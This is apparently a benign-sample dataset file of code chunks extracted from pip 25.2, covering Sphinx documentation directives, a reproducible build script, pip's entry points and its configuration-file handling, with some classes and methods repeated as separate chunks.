    node.document = self.state.document\n        desc = ViewList()\n        cmd = create_command(self.arguments[0])\n        assert cmd.__doc__ is not None\n        description = dedent(cmd.__doc__)\n        for line in description.split(\"\\n\"):\n            desc.append(line, \"\")\n        self.state.nested_parse(desc, 0, node)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipOptions(rst.Directive):\n    def _format_option(\n        self, option: optparse.Option, cmd_name: str | None = None\n    ) -> list[str]:\n        bookmark_line = (\n            f\".. _`{cmd_name}_{option._long_opts[0]}`:\"\n            if cmd_name\n            else f\".. _`{option._long_opts[0]}`:\"\n        )\n        line = \".. option:: \"\n        if option._short_opts:\n            line += option._short_opts[0]\n        if option._short_opts and option._long_opts:\n            line += \", \" + option._long_opts[0]\n        elif option._long_opts:\n            line += option._long_opts[0]\n        if option.takes_value():\n            metavar = option.metavar or option.dest\n            assert metavar is not None\n            line += f\" <{metavar.lower()}>\"\n        # fix defaults\n        assert option.help is not None\n        opt_help = option.help.replace(\"%default\", str(option.default))\n        # fix paths with sys.prefix\n        opt_help = opt_help.replace(sys.prefix, \"<sys.prefix>\")\n        env_var_names = convert_cli_opt_names_to_envvars(option._long_opts)\n        env_var_names_src = \", \".join(f\"``{env_var}``\" for env_var in env_var_names)\n        return [\n            bookmark_line,\n            \"\",\n            line,\n            \"\",\n            f\"    {opt_help}\",\n            \"\",\n            f\"    (environment variable: {env_var_names_src})\",\n            \"\",\n        ]\n\n    def _format_options(\n        self, options: Iterable[optparse.Option], cmd_name: str | None = None\n    ) -> None:\n        for option in options:\n            if option.help == optparse.SUPPRESS_HELP:\n                continue\n            for line in self._format_option(option, cmd_name):\n                self.view_list.append(line, \"\")\n\n    def run(self) -> list[nodes.Node]:\n        node = nodes.paragraph()\n        node.document = self.state.document\n        self.view_list = ViewList()\n        self.process_options()\n        self.state.nested_parse(self.view_list, 0, node)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipGeneralOptions(PipOptions):\n    def process_options(self) -> None:\n        self._format_options([o() for o in cmdoptions.general_group[\"options\"]])\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipIndexOptions(PipOptions):\n    required_arguments = 1\n\n    def process_options(self) -> None:\n        cmd_name = self.arguments[0]\n        self._format_options(\n            [o() for o in cmdoptions.index_group[\"options\"]],\n            cmd_name=cmd_name,\n        )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipCommandOptions(PipOptions):\n    required_arguments = 1\n\n    def process_options(self) -> None:\n        cmd = create_command(self.arguments[0])\n        self._format_options(\n            cmd.parser.option_groups[0].option_list,\n            cmd_name=cmd.name,\n        )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipReqFileOptionsReference(PipOptions):\n    def determine_opt_prefix(self, opt_name: str) -> str:\n        for command in commands_dict:\n            cmd = create_command(command)\n            if cmd.cmd_opts.has_option(opt_name):\n                return command\n\n        raise KeyError(f\"Could not identify prefix of opt {opt_name}\")\n\n    def process_options(self) -> None:\n        for option in SUPPORTED_OPTIONS:\n            if getattr(option, \"deprecated\", False):\n                continue\n\n            opt = option()\n            opt_name = opt._long_opts[0]\n            if opt._short_opts:\n                short_opt_name = f\"{opt._short_opts[0]}, \"\n            else:\n                short_opt_name = \"\"\n\n            if option in cmdoptions.general_group[\"options\"]:\n                prefix = \"\"\n            else:\n                prefix = f\"{self.determine_opt_prefix(opt_name)}_\"\n\n            self.view_list.append(\n                f\"*  :ref:`{short_opt_name}{opt_name}<{prefix}{opt_name}>`\",\n                \"\\n\",\n            )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipCLIDirective(rst.Directive):\n    \"\"\"\n    - Only works when used in a MyST document.\n    - Requires sphinx-inline-tabs' tab directive.\n    \"\"\"\n\n    has_content = True\n    optional_arguments = 1\n\n    def run(self) -> list[nodes.Node]:\n        node = nodes.paragraph()\n        node.document = self.state.document\n\n        os_variants = {\n            \"Linux\": {\n                \"highlighter\": \"console\",\n                \"executable\": \"python\",\n                \"prompt\": \"$\",\n            },\n            \"MacOS\": {\n                \"highlighter\": \"console\",\n                \"executable\": \"python\",\n                \"prompt\": \"$\",\n            },\n            \"Windows\": {\n                \"highlighter\": \"doscon\",\n                \"executable\": \"py\",\n                \"prompt\": \"C:>\",\n            },\n        }\n\n        if self.arguments:\n            assert self.arguments == [\"in-a-venv\"]\n            in_virtual_environment = True\n        else:\n            in_virtual_environment = False\n\n        lines = []\n        # Create a tab for each OS\n        for os, variant in os_variants.items():\n            # Unpack the values\n            prompt = variant[\"prompt\"]\n            highlighter = variant[\"highlighter\"]\n            if in_virtual_environment:\n                executable = \"python\"\n                pip_spelling = \"pip\"\n            else:\n                executable = variant[\"executable\"]\n                pip_spelling = f\"{executable} -m pip\"\n\n            # Substitute the various \"prompts\" into the correct variants\n            substitution_pipeline = [\n                (\n                    r\"(^|(?<=\\n))\\$ python\",\n                    f\"{prompt} {executable}\",\n                ),\n                (\n                    r\"(^|(?<=\\n))\\$ pip\",\n                    f\"{prompt} {pip_spelling}\",\n                ),\n            ]\n            content = self.block_text\n            for pattern, substitution in substitution_pipeline:\n                content = re.sub(pattern, substitution, content)\n\n            # Write the tab\n            lines.append(f\"````{{tab}} {os}\")\n            lines.append(f\"```{highlighter}\")\n            lines.append(f\"{content}\")\n            lines.append(\"```\")\n            lines.append(\"````\")\n\n        string_list = StringList(lines)\n        self.state.nested_parse(string_list, 0, node)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef setup(app: Sphinx) -> dict[str, bool | str]:\n    app.add_directive(\"pip-command-usage\", PipCommandUsage)\n    app.add_directive(\"pip-command-description\", PipCommandDescription)\n    app.add_directive(\"pip-command-options\", PipCommandOptions)\n    app.add_directive(\"pip-general-options\", PipGeneralOptions)\n    app.add_directive(\"pip-index-options\", PipIndexOptions)\n    app.add_directive(\n        \"pip-requirements-file-options-ref-list\", PipReqFileOptionsReference\n    )\n    app.add_directive(\"pip-news-include\", PipNewsInclude)\n    app.add_directive(\"pip-cli\", PipCLIDirective)\n    return {\n        \"parallel_read_safe\": True,\n        \"parallel_write_safe\": True,\n    }\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef _is_version_section_title_underline(self, prev: str | None, curr: str) -> bool:\n        \"\"\"Find a ==== line that marks the version section title.\"\"\"\n        if prev is None:\n            return False\n        if re.match(r\"^=+$\", curr) is None:\n            return False\n        if len(curr) < len(prev):\n            return False\n        return True\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef _iter_lines_with_refs(self, lines: Iterable[str]) -> Iterator[str]:\n        \"\"\"Transform the input lines to add a ref before each section title.\n\n        This is done by looking one line ahead and locate a title's underline,\n        and add a ref before the title text.\n\n        Dots in the version is converted into dash, and a ``v`` is prefixed.\n        This makes Sphinx use them as HTML ``id`` verbatim without generating\n        auto numbering (which would make the the anchors unstable).\n        \"\"\"\n        prev = None\n        for line in lines:\n            # Transform the previous line to include an explicit ref.\n            if self._is_version_section_title_underline(prev, line):\n                assert prev is not None\n                vref = prev.split(None, 1)[0].replace(\".\", \"-\")\n                yield f\".. _`v{vref}`:\"\n                yield \"\"  # Empty line between ref and the title.\n            if prev is not None:\n                yield prev\n            prev = line\n        if prev is not None:\n            yield prev\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef run(self) -> list[nodes.Node]:\n        source = self.state_machine.input_lines.source(\n            self.lineno - self.state_machine.input_offset - 1,\n        )\n        path = (\n            pathlib.Path(source).resolve().parent.joinpath(self.arguments[0]).resolve()\n        )\n        include_lines = statemachine.string2lines(\n            path.read_text(encoding=\"utf-8\"),\n            self.state.document.settings.tab_width,\n            convert_whitespace=True,\n        )\n        include_lines = list(self._iter_lines_with_refs(include_lines))\n        self.state_machine.insert_input(include_lines, str(path))\n        return []\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef run(self) -> list[nodes.Node]:\n        cmd = create_command(self.arguments[0])\n        cmd_prefix = \"python -m pip\"\n        if len(self.arguments) > 1:\n            cmd_prefix = \" \".join(self.arguments[1:])\n            cmd_prefix = cmd_prefix.strip('\"')\n            cmd_prefix = cmd_prefix.strip(\"'\")\n        usage = dedent(cmd.usage.replace(\"%prog\", f\"{cmd_prefix} {cmd.name}\")).strip()\n        node = nodes.literal_block(usage, usage)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef run(self) -> list[nodes.Node]:\n        node = nodes.paragraph()\n        node.document = self.state.document\n        desc = ViewList()\n        cmd = create_command(self.arguments[0])\n        assert cmd.__doc__ is not None\n        description = dedent(cmd.__doc__)\n        for line in description.split(\"\\n\"):\n            desc.append(line, \"\")\n        self.state.nested_parse(desc, 0, node)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef _format_option(\n        self, option: optparse.Option, cmd_name: str | None = None\n    ) -> list[str]:\n        bookmark_line = (\n            f\".. _`{cmd_name}_{option._long_opts[0]}`:\"\n            if cmd_name\n            else f\".. _`{option._long_opts[0]}`:\"\n        )\n        line = \".. option:: \"\n        if option._short_opts:\n            line += option._short_opts[0]\n        if option._short_opts and option._long_opts:\n            line += \", \" + option._long_opts[0]\n        elif option._long_opts:\n            line += option._long_opts[0]\n        if option.takes_value():\n            metavar = option.metavar or option.dest\n            assert metavar is not None\n            line += f\" <{metavar.lower()}>\"\n        # fix defaults\n        assert option.help is not None\n        opt_help = option.help.replace(\"%default\", str(option.default))\n        # fix paths with sys.prefix\n        opt_help = opt_help.replace(sys.prefix, \"<sys.prefix>\")\n        env_var_names = convert_cli_opt_names_to_envvars(option._long_opts)\n        env_var_names_src = \", \".join(f\"``{env_var}``\" for env_var in env_var_names)\n        return [\n            bookmark_line,\n            \"\",\n            line,\n            \"\",\n            f\"    {opt_help}\",\n            \"\",\n            f\"    (environment variable: {env_var_names_src})\",\n            \"\",\n        ]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef _format_options(\n        self, options: Iterable[optparse.Option], cmd_name: str | None = None\n    ) -> None:\n        for option in options:\n            if option.help == optparse.SUPPRESS_HELP:\n                continue\n            for line in self._format_option(option, cmd_name):\n                self.view_list.append(line, \"\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef run(self) -> list[nodes.Node]:\n        node = nodes.paragraph()\n        node.document = self.state.document\n        self.view_list = ViewList()\n        self.process_options()\n        self.state.nested_parse(self.view_list, 0, node)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef process_options(self) -> None:\n        self._format_options([o() for o in cmdoptions.general_group[\"options\"]])\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef process_options(self) -> None:\n        cmd_name = self.arguments[0]\n        self._format_options(\n            [o() for o in cmdoptions.index_group[\"options\"]],\n            cmd_name=cmd_name,\n        )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef process_options(self) -> None:\n        cmd = create_command(self.arguments[0])\n        self._format_options(\n            cmd.parser.option_groups[0].option_list,\n            cmd_name=cmd.name,\n        )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef determine_opt_prefix(self, opt_name: str) -> str:\n        for command in commands_dict:\n            cmd = create_command(command)\n            if cmd.cmd_opts.has_option(opt_name):\n                return command\n\n        raise KeyError(f\"Could not identify prefix of opt {opt_name}\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef process_options(self) -> None:\n        for option in SUPPORTED_OPTIONS:\n            if getattr(option, \"deprecated\", False):\n                continue\n\n            opt = option()\n            opt_name = opt._long_opts[0]\n            if opt._short_opts:\n                short_opt_name = f\"{opt._short_opts[0]}, \"\n            else:\n                short_opt_name = \"\"\n\n            if option in cmdoptions.general_group[\"options\"]:\n                prefix = \"\"\n            else:\n                prefix = f\"{self.determine_opt_prefix(opt_name)}_\"\n\n            self.view_list.append(\n                f\"*  :ref:`{short_opt_name}{opt_name}<{prefix}{opt_name}>`\",\n                \"\\n\",\n            )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef run(self) -> list[nodes.Node]:\n        node = nodes.paragraph()\n        node.document = self.state.document\n\n        os_variants = {\n            \"Linux\": {\n                \"highlighter\": \"console\",\n                \"executable\": \"python\",\n                \"prompt\": \"$\",\n            },\n            \"MacOS\": {\n                \"highlighter\": \"console\",\n                \"executable\": \"python\",\n                \"prompt\": \"$\",\n            },\n            \"Windows\": {\n                \"highlighter\": \"doscon\",\n                \"executable\": \"py\",\n                \"prompt\": \"C:>\",\n            },\n        }\n\n        if self.arguments:\n            assert self.arguments == [\"in-a-venv\"]\n            in_virtual_environment = True\n        else:\n            in_virtual_environment = False\n\n        lines = []\n        # Create a tab for each OS\n        for os, variant in os_variants.items():\n            # Unpack the values\n            prompt = variant[\"prompt\"]\n            highlighter = variant[\"highlighter\"]\n            if in_virtual_environment:\n                executable = \"python\"\n                pip_spelling = \"pip\"\n            else:\n                executable = variant[\"executable\"]\n                pip_spelling = f\"{executable} -m pip\"\n\n            # Substitute the various \"prompts\" into the correct variants\n            substitution_pipeline = [\n                (\n                    r\"(^|(?<=\\n))\\$ python\",\n                    f\"{prompt} {executable}\",\n                ),\n                (\n                    r\"(^|(?<=\\n))\\$ pip\",\n                    f\"{prompt} {pip_spelling}\",\n                ),\n            ]\n            content = self.block_text\n            for pattern, substitution in substitution_pipeline:\n                content = re.sub(pattern, substitution, content)\n\n            # Write the tab\n            lines.append(f\"````{{tab}} {os}\")\n            lines.append(f\"```{highlighter}\")\n            lines.append(f\"{content}\")\n            lines.append(\"```\")\n            lines.append(\"````\")\n\n        string_list = StringList(lines)\n        self.state.nested_parse(string_list, 0, node)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py (class)\nclass EnvBuilder(venv.EnvBuilder):\n    \"\"\"A subclass of venv.EnvBuilder that exposes the python executable command.\"\"\"\n\n    def ensure_directories(\n        self, env_dir: Union[str, bytes, \"PathLike[str]\", \"PathLike[bytes]\"]\n    ) -> SimpleNamespace:\n        context = super().ensure_directories(env_dir)\n        self.env_exec_cmd = context.env_exec_cmd\n        return context\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py (function)\ndef get_git_head_timestamp() -> str:\n    return subprocess.run(\n        [\n            \"git\",\n            \"log\",\n            \"-1\",\n            \"--pretty=format:%ct\",\n        ],\n        text=True,\n        stdout=subprocess.PIPE,\n    ).stdout.strip()\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py (function)\ndef main() -> None:\n    with tempfile.TemporaryDirectory() as build_env:\n        env_builder = EnvBuilder(with_pip=True)\n        # If this venv creation step fails, you may be hitting\n        # https://github.com/astral-sh/python-build-standalone/issues/381\n        # Try running with a another Python distribution.\n        env_builder.create(build_env)\n        subprocess.run(\n            [\n                env_builder.env_exec_cmd,\n                \"-Im\",\n                \"pip\",\n                \"install\",\n                \"--no-deps\",\n                \"--only-binary=:all:\",\n                \"--require-hashes\",\n                \"-r\",\n                Path(__file__).parent / \"build-requirements.txt\",\n            ],\n            check=True,\n        )\n        subprocess.run(\n            [\n                env_builder.env_exec_cmd,\n                \"-Im\",\n                \"build\",\n                \"--no-isolation\",\n            ],\n            check=True,\n            env={\"SOURCE_DATE_EPOCH\": get_git_head_timestamp()},\n            cwd=Path(__file__).parent.parent,\n        )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py (function)\ndef ensure_directories(\n        self, env_dir: Union[str, bytes, \"PathLike[str]\", \"PathLike[bytes]\"]\n    ) -> SimpleNamespace:\n        context = super().ensure_directories(env_dir)\n        self.env_exec_cmd = context.env_exec_cmd\n        return context\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__init__.py (function)\ndef main(args: list[str] | None = None) -> int:\n    \"\"\"This is an internal API only meant for use by pip's own console scripts.\n\n    For additional details, see https://github.com/pypa/pip/issues/7498.\n    \"\"\"\n    from pip._internal.utils.entrypoints import _wrapper\n\n    return _wrapper(args)\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__pip-runner__.py (function)\ndef version_str(version):  # type: ignore\n    return \".\".join(str(v) for v in version)\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__pip-runner__.py (class)\nclass PipImportRedirectingFinder:\n    @classmethod\n    def find_spec(self, fullname, path=None, target=None):  # type: ignore\n        if fullname != \"pip\":\n            return None\n\n        spec = PathFinder.find_spec(fullname, [PIP_SOURCES_ROOT], target)\n        assert spec, (PIP_SOURCES_ROOT, fullname)\n        return spec\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__pip-runner__.py (function)\ndef find_spec(self, fullname, path=None, target=None):  # type: ignore\n        if fullname != \"pip\":\n            return None\n\n        spec = PathFinder.find_spec(fullname, [PIP_SOURCES_ROOT], target)\n        assert spec, (PIP_SOURCES_ROOT, fullname)\n        return spec\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__main__.py (file)\nimport os\nimport sys\n\n# Remove '' and current working directory from the first entry\n# of sys.path, if present to avoid using current directory\n# in pip commands check, freeze, install, list and show,\n# when invoked as python -m pip <command>\nif sys.path[0] in (\"\", os.getcwd()):\n    sys.path.pop(0)\n\n# If we are running from a wheel, add the wheel to sys.path\n# This allows the usage python pip-*.whl/pip install pip-*.whl\nif __package__ == \"\":\n    # __file__ is pip-*.whl/pip/__main__.py\n    # first dirname call strips of '/__main__.py', second strips off '/pip'\n    # Resulting path is the name of the wheel itself\n    # Add that to sys.path so we can import pip\n    path = os.path.dirname(os.path.dirname(__file__))\n    sys.path.insert(0, path)\n\nif __name__ == \"__main__\":\n    from pip._internal.cli.main import main as _main\n\n    sys.exit(_main())\n\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef _normalize_name(name: str) -> str:\n    \"\"\"Make a name consistent regardless of source (environment or file)\"\"\"\n    name = name.lower().replace(\"_\", \"-\")\n    if name.startswith(\"--\"):\n        name = name[2:]  # only prefer long opts\n    return name\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef _disassemble_key(name: str) -> list[str]:\n    if \".\" not in name:\n        error_message = (\n            \"Key does not contain dot separated section and key. \"\n            f\"Perhaps you wanted to use 'global.{name}' instead?\"\n        )\n        raise ConfigurationError(error_message)\n    return name.split(\".\", 1)\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef get_configuration_files() -> dict[Kind, list[str]]:\n    global_config_files = [\n        os.path.join(path, CONFIG_BASENAME) for path in appdirs.site_config_dirs(\"pip\")\n    ]\n\n    site_config_file = os.path.join(sys.prefix, CONFIG_BASENAME)\n    legacy_config_file = os.path.join(\n        os.path.expanduser(\"~\"),\n        \"pip\" if WINDOWS else \".pip\",\n        CONFIG_BASENAME,\n    )\n    new_config_file = os.path.join(appdirs.user_config_dir(\"pip\"), CONFIG_BASENAME)\n    return {\n        kinds.GLOBAL: global_config_files,\n        kinds.SITE: [site_config_file],\n        kinds.USER: [legacy_config_file, new_config_file],\n    }\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (class)\nclass Configuration:\n    \"\"\"Handles management of configuration.\n\n    Provides an interface to accessing and managing configuration files.\n\n    This class converts provides an API that takes \"section.key-name\" style\n    keys and stores the value associated with it as \"key-name\" under the\n    section \"section\".\n\n    This allows for a clean interface wherein the both the section and the\n    key-name are preserved in an easy to manage form in the configuration files\n    and the data stored is also nice.\n    \"\"\"\n\n    def __init__(self, isolated: bool, load_only: Kind | None = None) -> None:\n        super().__init__()\n\n        if load_only is not None and load_only not in VALID_LOAD_ONLY:\n            raise ConfigurationError(\n                \"Got invalid value for load_only - should be one of {}\".format(\n                    \", \".join(map(repr, VALID_LOAD_ONLY))\n                )\n            )\n        self.isolated = isolated\n        self.load_only = load_only\n\n        # Because we keep track of where we got the data from\n        self._parsers: dict[Kind, list[tuple[str, RawConfigParser]]] = {\n            variant: [] for variant in OVERRIDE_ORDER\n        }\n        self._config: dict[Kind, dict[str, dict[str, Any]]] = {\n            variant: {} for variant in OVERRIDE_ORDER\n        }\n        self._modified_parsers: list[tuple[str, RawConfigParser]] = []\n\n    def load(self) -> None:\n        \"\"\"Loads configuration from configuration files and environment\"\"\"\n        self._load_config_files()\n        if not self.isolated:\n            self._load_environment_vars()\n\n    def get_file_to_edit(self) -> str | None:\n        \"\"\"Returns the file with highest priority in configuration\"\"\"\n        assert self.load_only is not None, \"Need to be specified a file to be editing\"\n\n        try:\n            return self._get_parser_to_modify()[0]\n        except IndexError:\n            return None\n\n    def items(self) -> Iterable[tuple[str, Any]]:\n        \"\"\"Returns key-value pairs like dict.items() representing the loaded\n        configuration\n        \"\"\"\n        return self._dictionary.items()\n\n    def get_value(self, key: str) -> Any:\n        \"\"\"Get a value from the configuration.\"\"\"\n        orig_key = key\n        key = _normalize_name(key)\n        try:\n            clean_config: dict[str, Any] = {}\n            for file_values in self._dictionary.values():\n                clean_config.update(file_values)\n            return clean_config[key]\n        except KeyError:\n            # disassembling triggers a more useful error message than simply\n            # \"No such key\" in the case that the key isn't in the form command.option\n            _disassemble_key(key)\n            raise ConfigurationError(f\"No such key - {orig_key}\")\n\n    def set_value(self, key: str, value: Any) -> None:\n        \"\"\"Modify a value in the configuration.\"\"\"\n        key = _normalize_name(key)\n        self._ensure_have_load_only()\n\n        assert self.load_only\n        fname, parser = self._get_parser_to_modify()\n\n        if parser is not None:\n            section, name = _disassemble_key(key)\n\n            # Modify the parser and the configuration\n            if not parser.has_section(section):\n                parser.add_section(section)\n            parser.set(section, name, value)\n\n        self._config[self.load_only].setdefault(fname, {})\n        self._config[self.load_only][fname][key] = value\n        self._mark_as_modified(fname, parser)\n\n    def unset_value(self, key: str) -> None:\n        \"\"\"Unset a value in the configuration.\"\"\"\n        orig_key = key\n        key = _normalize_name(key)\n        self._ensure_have_load_only()\n\n        assert self.load_only\n        fname, parser = self._get_parser_to_modify()\n\n        if (\n            key not in self._config[self.load_only][fname]\n            and key not in self._config[self.load_only]\n        ):\n            raise ConfigurationError(f\"No such key - {orig_key}\")\n\n        if parser is not None:\n            section, name = _disassemble_key(key)\n            if not (\n                parser.has_section(section) and parser.remove_option(section, name)\n            ):\n                # The option was not removed.\n                raise ConfigurationError(\n                    \"Fatal Internal error [id=1]. Please report as a bug.\"\n                )\n\n            # The section may be empty after the option was removed.\n            if not parser.items(section):\n                parser.remove_section(section)\n            self._mark_as_modified(fname, parser)\n        try:\n            del self._config[self.load_only][fname][key]\n        except KeyError:\n            del self._config[self.load_only][key]\n\n    def save(self) -> None:\n        \"\"\"Save the current in-memory state.\"\"\"\n        self._ensure_have_load_only()\n\n        for fname, parser in self._modified_parsers:\n            logger.info(\"Writing to %s\", fname)\n\n            # Ensure directory exists.\n            ensure_dir(os.path.dirname(fname))\n\n            # Ensure directory's permission(need to be writeable)\n            try:\n                with open(fname, \"w\") as f:\n                    parser.write(f)\n            except OSError as error:\n                raise ConfigurationError(\n                    f\"An error occurred while writing to the configuration file \"\n                    f\"{fname}: {error}\"\n                )\n\n    #\n    # Private routines\n    #\n\n    def _ensure_have_load_only(self) -> None:\n        if self.load_only is None:\n            raise ConfigurationError(\"Needed a specific file to be modifying.\")\n        logger.debug(\"Will be working with %s variant only\", self.load_only)\n\n    @property\n    def _dictionary(self) -> dict[str, dict[str, Any]]:\n        \"\"\"A dictionary representing the loaded configuration.\"\"\"\n        # NOTE: Dictionaries are not populated if not loaded. So, conditionals\n        #       are not needed here.\n        retval = {}\n\n        for variant in OVERRIDE_ORDER:\n            retval.update(self._config[variant])\n\n        return retval\n\n    def _load_config_files(self) -> None:\n        \"\"\"Loads configuration from configuration files\"\"\"\n        config_files = dict(self.iter_config_files())\n        if config_files[kinds.ENV][0:1] == [os.devnull]:\n            logger.debug(\n                \"Skipping loading configuration files due to \"\n                \"environment's PIP_CONFIG_FILE being os.devnull\"\n            )\n            return\n\n        for variant, files in config_files.items():\n            for fname in files:\n                # If there's specific variant set in `load_only`, load only\n                # that variant, not the others.\n                if self.load_only is not None and variant != self.load_only:\n                    logger.debug(\"Skipping file '%s' (variant: %s)\", fname, variant)\n                    continue\n\n                parser = self._load_file(variant, fname)\n\n                # Keeping track of the parsers used\n                self._parsers[variant].append((fname, parser))\n\n    def _load_file(self, variant: Kind, fname: str) -> RawConfigParser:\n        logger.verbose(\"For variant '%s', will try loading '%s'\", variant, fname)\n        parser = self._construct_parser(fname)\n\n        for section in parser.sections():\n            items = parser.items(section)\n            self._config[variant].setdefault(fname, {})\n            self._config[variant][fname].update(self._normalized_keys(section, items))\n\n        return parser\n\n    def _construct_parser(self, fname: str) -> RawConfigParser:\n        parser = configparser.RawConfigParser()\n        # If there is no such file, don't bother reading it but create the\n        # parser anyway, to hold the data.\n        # Doing this is useful when modifying and saving files, where we don't\n        # need to construct a parser.\n        if os.path.exists(fname):\n            locale_encoding = locale.getpreferredencoding(False)\n            try:\n                parser.read(fname, encoding=locale_encoding)\n            except UnicodeDecodeError:\n                # See https://github.com/pypa/pip/issues/4963\n                raise ConfigurationFileCouldNotBeLoaded(\n                    reason=f\"contains invalid {locale_encoding} characters\",\n                    fname=fname,\n                )\n            except configparser.Error as error:\n                # See https://github.com/pypa/pip/issues/4893\n                raise ConfigurationFileCouldNotBeLoaded(error=error)\n        return parser\n\n    def _load_environment_vars(self) -> None:\n        \"\"\"Loads configuration from environment variables\"\"\"\n        self._config[kinds.ENV_VAR].setdefault(\":env:\", {})\n        self._config[kinds.ENV_VAR][\":env:\"].update(\n            self._normalized_keys(\":env:\", self.get_environ_vars())\n        )\n\n    def _normalized_keys(\n        self, section: str, items: Iterable[tuple[str, Any]]\n    ) -> dict[str, Any]:\n        \"\"\"Normalizes items to construct a dictionary with normalized keys.\n\n        This routine is where the names become keys and are made the same\n        regardless of source - configuration files or environment.\n        \"\"\"\n        normalized = {}\n        for name, val in items:\n            key = section + \".\" + _normalize_name(name)\n            normalized[key] = val\n        return normalized\n\n    def get_environ_vars(self) -> Iterable[tuple[str, str]]:\n        \"\"\"Returns a generator with all environmental vars with prefix PIP_\"\"\"\n        for key, val in os.environ.items():\n            if key.startswith(\"PIP_\"):\n                name = key[4:].lower()\n                if name not in ENV_NAMES_IGNORED:\n                    yield name, val\n\n    # XXX: This is patched in the tests.\n    def iter_config_files(self) -> Iterable[tuple[Kind, list[str]]]:\n        \"\"\"Yields variant and configuration files associated with it.\n\n        This should be treated like items of a dictionary. The order\n        here doesn't affect what gets overridden. That is controlled\n        by OVERRIDE_ORDER. However this does control the order they are\n        displayed to the user. It's probably most ergonomic to display\n        things in the same order as OVERRIDE_ORDER\n        \"\"\"\n        # SMELL: Move the conditions out of this function\n\n        env_config_file = os.environ.get(\"PIP_CONFIG_FILE\", None)\n        config_files = get_configuration_files()\n\n        yield kinds.GLOBAL, config_files[kinds.GLOBAL]\n\n        # per-user config is not loaded when env_config_file exists\n        should_load_user_config = not self.isolated and not (\n            env_config_file and os.path.exists(env_config_file)\n        )\n        if should_load_user_config:\n            # The legacy config file is overridden by the new config file\n            yield kinds.USER, config_files[kinds.USER]\n\n        # virtualenv config\n        yield kinds.SITE, config_files[kinds.SITE]\n\n        if env_config_file is not None:\n            yield kinds.ENV, [env_config_file]\n        else:\n            yield kinds.ENV, []\n\n    def get_values_in_config(self, variant: Kind) -> dict[str, Any]:\n        \"\"\"Get values present in a config file\"\"\"\n        return self._config[variant]\n\n    def _get_parser_to_modify(self) -> tuple[str, RawConfigParser]:\n        # Determine which parser to modify\n        assert self.load_only\n        parsers = self._parsers[self.load_only]\n        if not parsers:\n            # This should not happen if everything works correctly.\n            raise ConfigurationError(\n                \"Fatal Internal error [id=2]. Please report as a bug.\"\n            )\n\n        # Use the highest priority parser.\n        return parsers[-1]\n\n    # XXX: This is patched in the tests.\n    def _mark_as_modified(self, fname: str, parser: RawConfigParser) -> None:\n        file_parser_tuple = (fname, parser)\n        if file_parser_tuple not in self._modified_parsers:\n            self._modified_parsers.append(file_parser_tuple)\n\n    def __repr__(self) -> str:\n        return f\"{self.__class__.__name__}({self._dictionary!r})\"\n==================================================\n\n# File: 